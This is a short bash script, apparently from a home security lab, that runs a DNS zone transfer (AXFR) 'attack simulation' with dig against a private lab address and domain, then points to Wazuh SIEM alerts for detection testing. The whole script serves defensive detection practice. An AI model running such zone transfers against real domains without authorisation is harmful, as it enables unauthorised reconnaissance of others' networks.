#!/bin/bash
TARGET_IP="192.168.56.20"
DOMAIN="altay.local"

echo "[*] Starting DNS Zone Transfer (AXFR) attack simulation against $TARGET_IP for domain $DOMAIN..."
dig @$TARGET_IP axfr $DOMAIN

echo "[*] Simulation complete. Check Wazuh SIEM alerts on blue-server."
